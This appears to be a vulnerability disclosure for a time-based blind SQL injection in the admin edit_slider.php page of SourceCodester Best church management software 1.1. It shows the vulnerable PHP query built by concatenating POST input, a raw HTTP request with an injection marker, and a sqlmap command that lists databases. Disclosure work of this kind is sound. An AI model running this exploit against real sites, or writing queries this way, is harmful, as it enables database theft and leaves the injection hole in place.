# Code Source
https://www.sourcecodester.com/php/17856/best-church-management-software-free-download-full-version.html
# Description
A vulnerability has been found in SourceCodester Best church management software 1.1 and classified as critical. SourceCodester Best church management software 1.1 has a SQL Injection vulnerability in `/admin/edit_slider.php`. Affected is file `/admin/edit_slider.php`,The manipulation of the argument `id` leads to SQL inject. Remote attackers can leverage time-based blind SQL injection to extract data from the database.

# Request
```
POST /admin/edit_slider.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: http://127.0.0.1
Connection: keep-alive
Referer: http://127.0.0.1/index.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Priority: u=0, i

id=*
```

# Affect code(`/admin/edit_slider.php`)
```
......
<?php
$stmt = $conn->prepare("SELECT * FROM `slider` WHERE id='" . $_POST['id'] . "' ");
$stmt->execute();
$record = $stmt->fetchAll();
......
```

# Exploit
```
python sqlmap.py -r .\1.txt --dbs
```

![图片](https://github.com/user-attachments/assets/96b337db-351e-4bda-a548-a5d2f4cbe202)

![图片](https://github.com/user-attachments/assets/9c235ba5-22d7-45b4-b72c-89cff9b29fd7)
